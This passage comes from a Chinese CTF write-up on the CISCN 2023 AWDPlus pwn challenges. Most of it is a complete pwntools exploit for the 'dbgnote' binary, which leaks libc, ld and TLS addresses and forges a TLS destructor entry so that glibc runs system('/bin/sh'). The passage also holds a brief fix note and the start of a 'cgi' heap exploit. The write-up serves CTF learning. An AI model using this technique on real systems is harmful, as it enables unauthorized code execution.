<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">ld_addr</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">ld_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">tls_base</span><span class="sh">'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113121450-071pw8t.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113121450-071pw8t.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>差不多了，然后 执行到 <code class="language-plaintext highlighter-rouge">__call_tls_dtors</code>​ 根据 情况取调试 就可以了</li>
</ul>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113121901-5iv97k3.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113121901-5iv97k3.png" alt="image" loading="lazy"></a>​</p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre><span class="c1">// glibc 2.35</span>
<span class="n">__call_tls_dtors</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">while</span> <span class="p">(</span><span class="n">tls_dtor_list</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">struct</span> <span class="n">dtor_list</span> <span class="o">*</span><span class="n">cur</span> <span class="o">=</span> <span class="n">tls_dtor_list</span><span class="p">;</span>
      <span class="n">dtor_func</span> <span class="n">func</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">;</span>
<span class="cp">#ifdef PTR_DEMANGLE
</span>      <span class="n">PTR_DEMANGLE</span> <span class="p">(</span><span class="n">func</span><span class="p">);</span>
<span class="cp">#endif
</span>
      <span class="n">tls_dtor_list</span> <span class="o">=</span> <span class="n">tls_dtor_list</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
      <span class="n">func</span> <span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">obj</span><span class="p">);</span> <span class="c1">// call rax</span>

      <span class="cm">/* Ensure that the MAP dereference happens before
	 l_tls_dtor_count decrement.  That way, we protect this access from a
	 potential DSO unload in _dl_close_worker, which happens when
	 l_tls_dtor_count is 0.  See CONCURRENCY NOTES for more detail.  */</span>
      <span class="n">atomic_fetch_add_release</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">l_tls_dtor_count</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span>
      <span class="n">free</span> <span class="p">(</span><span class="n">cur</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">__call_tls_dtors</span><span class="p">)</span>

</pre></td></tr></tbody></table></code></div></div>

<p>​​</p>

<ul>
  <li>exploit</li>
</ul>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
brva 0x01500
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./dbgnote</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,[</span><span class="sh">'</span><span class="s">run</span><span class="sh">'</span><span class="p">])</span>
<span class="c1">#io = remote()
</span>

<span class="n">nl</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">Note_Add</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">Note_Delete</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">Note_Write</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">Note_Read</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">++--++--</span><span class="sh">'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">UserName: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Size: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Note: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">rm</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Index: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Index: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Note: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Index: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">gift</span><span class="p">(</span><span class="n">e</span><span class="o">=</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">+</span><span class="n">e</span><span class="p">)</span>



<span class="nf">login</span><span class="p">(</span><span class="sh">'</span><span class="s">LD_DEBUG=all</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="sh">'</span><span class="s">tttttt</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#login('run\x00')
</span><span class="nf">gift</span><span class="p">()</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Super note: </span><span class="sh">'</span><span class="p">)</span>
<span class="n">x</span> <span class="o">=</span>  <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">))</span>
<span class="n">name</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="mh">0x1c</span>
<span class="nf">ls</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">)</span>


<span class="n">pay</span> <span class="o">=</span> <span class="mi">6</span> <span class="o">*</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p16</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Note $ </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>



<span class="c1">#gdb.attach(io,'brva 0x000017E4')
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Size: </span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#gdb.attach(io)
</span><span class="nf">s</span><span class="p">(</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x19</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">base: </span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">18</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="n">ld_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mi">2203664</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">ld_addr</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">[Addr] </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">s</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="n">ld_addr</span><span class="p">))</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">[Read] </span><span class="sh">'</span><span class="p">)</span>
<span class="n">ld</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
<span class="n">ld_base</span> <span class="o">=</span> <span class="n">ld</span> <span class="o">-</span> <span class="mi">89392</span>
<span class="n">tls_base</span> <span class="o">=</span> <span class="n">ld_base</span> <span class="o">-</span> <span class="mi">100544</span>
<span class="c1">#gdb.attach(io)
</span><span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">ld_addr</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">ld_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">tls_base</span><span class="sh">'</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">ror</span><span class="p">(</span><span class="n">num</span><span class="p">,</span><span class="n">i</span><span class="p">):</span>
    <span class="n">part1</span> <span class="o">=</span> <span class="n">num</span> <span class="o">&gt;&gt;</span> <span class="n">i</span>
    <span class="n">part2</span> <span class="o">=</span> <span class="n">num</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">64</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span>
    <span class="n">part2</span> <span class="o">&amp;=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span>
    <span class="k">return</span> <span class="n">part1</span> <span class="o">+</span> <span class="n">part2</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">[Addr] </span><span class="sh">'</span><span class="p">)</span>
<span class="n">target</span> <span class="o">=</span> <span class="n">tls_base</span> <span class="o">-</span> <span class="mi">88</span>
<span class="c1">#mov    rbp, qword ptr fs:[rbx]
#RBX  0xffffffffffffffa8 = - 88
</span>

<span class="nf">s</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="n">target</span><span class="p">))</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">]</span>
<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nf">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="sh">'</span><span class="p">))</span>

<span class="n">t1</span> <span class="o">=</span> <span class="nf">ror</span><span class="p">(</span><span class="n">target</span><span class="p">,</span><span class="mh">0x11</span><span class="p">)</span>
<span class="n">t2</span> <span class="o">=</span> <span class="n">t1</span> <span class="o">^</span> <span class="n">system</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">[Write] </span><span class="sh">'</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">88</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">tls_base</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1">#  需要一个地址
</span><span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">*</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">t2</span><span class="p">)</span> <span class="c1"># 0x90
</span>
<span class="nf">s</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>

<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113123406-eel0qvr.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113123406-eel0qvr.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<h3 id="fix-1"><span class="me-2">Fix</span><a href="#fix-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<ul>
  <li>把几处溢出的地方修复应该就没问题了</li>
</ul>

<p>‍</p>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113124045-jyrf5g0.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113124045-jyrf5g0.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113124210-s4c9105.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113124210-s4c9105.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<h2 id="cgi"><span class="me-2">cgi</span><a href="#cgi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>‍</p>

<h3 id="程序分析-2"><span class="me-2">程序分析</span><a href="#程序分析-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>
    <p>模拟 cgi , libc 2.31 的堆题，分析菜单要我的命啊</p>
  </li>
  <li>
    <p>UAF 漏洞, 利用就比较简单了</p>
  </li>
</ul>

<p>‍</p>

<h3 id="break-2"><span class="me-2">break</span><a href="#break-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240117123317-5cvs18u.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240117123317-5cvs18u.png" alt="image" loading="lazy"></a>​</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
